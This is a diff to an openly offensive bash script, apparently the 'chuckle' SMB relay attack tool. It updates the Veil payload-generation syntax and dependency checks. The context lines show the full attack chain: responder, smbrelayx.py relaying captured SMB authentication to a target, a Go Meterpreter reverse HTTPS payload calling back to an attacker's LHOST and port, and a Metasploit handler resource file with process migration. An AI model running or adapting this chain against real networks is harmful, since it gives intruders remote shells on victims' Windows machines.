@@ -24,12 +24,12 @@ echo -e '\n'
 
 # print nbt name, slow on big networks
 # valid values: 0 1
-shownbt=1
+shownbt=0
 
 echo "Checking dependencies..."
 command -v responder >/dev/null 2>&1 || { echo "responder is required but not installed.  Aborting." >&2; exit 1; }
 command -v nmap >/dev/null 2>&1 || { echo "nmap is required but not installed.  Aborting." >&2; exit 1; }
-command -v veil-evasion >/dev/null 2>&1 || { echo "veil-evasion is required but not installed.  Aborting." >&2; exit 1; }
+command -v veil >/dev/null 2>&1 || { echo "veil is required but not installed.  Aborting." >&2; exit 1; }
 command -v smbrelayx.py >/dev/null 2>&1 || { echo "smbrelayx.py is required but not installed.  Aborting." >&2; exit 1; }
 command -v msfconsole >/dev/null 2>&1 || { echo "msfconsole required but not installed.  Aborting." >&2; exit 1; }
 
@@ -99,7 +99,7 @@ echo "Please enter local port for reverse connection:"
 read port
 echo "Meterpreter shell will connect back to $lhost on port $port"
 echo "Generating Payload..."
-payload=$(veil-evasion -p go/meterpreter/rev_https -c LHOST=$lhost LPORT=$port -o $target 2>/dev/null|grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g")
+payload=$(veil -t evasion -p go/meterpreter/rev_https.py -o $target --ip $lhost --port $port -c LHOST=$lhost LPORT=$port 2>/dev/null|grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g")
 echo "Payload created: $payload"
 echo "Starting SMBRelayX..."
 smbrelayx.py -h $target -e $payload  >> ./chuckle.log  &
@@ -120,4 +120,3 @@ echo "set LPORT $port" >> chuckle.rc
 echo "set autorunscript post/windows/manage/migrate" >> chuckle.rc
 echo "exploit -j" >> chuckle.rc
 msfconsole -q -r ./chuckle.rc
-
